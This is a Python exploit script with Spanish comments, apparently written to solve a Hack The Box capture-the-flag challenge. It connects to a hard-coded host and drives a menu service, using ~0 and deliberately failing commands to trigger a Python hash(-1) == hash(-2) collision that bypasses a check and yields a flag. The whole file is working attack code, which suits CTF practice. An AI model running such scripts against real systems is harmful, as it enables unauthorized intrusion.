#!/usr/bin/env python3

import socket
import time
import sys

def wait_for_server(host, port, timeout=30):
    """Esperar a que el servidor esté disponible"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.close()
            return True
        except:
            time.sleep(1)
    return False

def exploit_server():
    """Explotar el servidor con la estrategia confirmada"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== EXPLOTADOR DE FLAG ===")
    print("Estrategia confirmada:")
    print("1. mode = ~0 (que es -1)")
    print("2. Comandos que fallen con returncode = 2 y returncode = 1")
    print("3. debug[0] = 2 * (-1) = -2")
    print("4. debug[1] = 1 * (-1) = -1")
    print("5. hash(-2) == hash(-1) == -2 ✓")
    print()
    
    # Esperar a que el servidor esté disponible
    print("Esperando a que el servidor esté disponible...")
    if not wait_for_server(host, port, timeout=60):
        print("Servidor no disponible después de 60 segundos")
        return None
    
    print("¡Servidor disponible! Conectando...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        
        print("¡Conectado!")
        
        def send_command(cmd):
            s.send(cmd.encode())
            time.sleep(0.2)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            return response
        
        def select_option(option_num):
            response = send_command(str(option_num) + "\n")
            return response
        
        def send_input(value):
            response = send_command(value + "\n")
            return response
        
        # Configurar mode = -1 usando ~0
        print("Configurando mode = ~0 (-1)")
        select_option(1)
        send_input("~0")
        
        # Configurar bin para que falle con returncode = 2
        print("Configurando bin para returncode = 2")
        select_option(2)
        send_input("ls")
        
        # Configurar args para que falle con returncode = 2
        select_option(3)
        send_input("--invalid-option")
        
        # Configurar switches para que falle con returncode = 1
        select_option(4)
        send_input("/nonexistent")
        
        # Ejecutar
        print("Ejecutando explotación...")
        response = select_option(5)
        
        print("Respuesta completa:")
        print(response)
        
        # Buscar flag
        if "What an awesome player!" in response:
            print("\n*** ¡¡¡FLAG ENCONTRADA!!! ***")
            if "HTB{" in response:
                start = response.find("HTB{")
                end = response.find("}", start) + 1
                if end > start:
                    flag = response[start:end]
                    print(f"🎉🎉🎉 FLAG: {flag} 🎉🎉🎉")
                    s.close()
                    return flag
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

def main():
    """Función principal"""
    print("Iniciando cazador de flags...")
    
    while True:
        flag = exploit_server()
        if flag:
            print(f"\n¡¡¡FLAG ENCONTRADA: {flag}!!!")
            print("¡¡¡CHALLENGE COMPLETADO!!!")
            break
        else:
            print("No se encontró la flag, reintentando en 10 segundos...")
            time.sleep(10)

if __name__ == "__main__":
    main()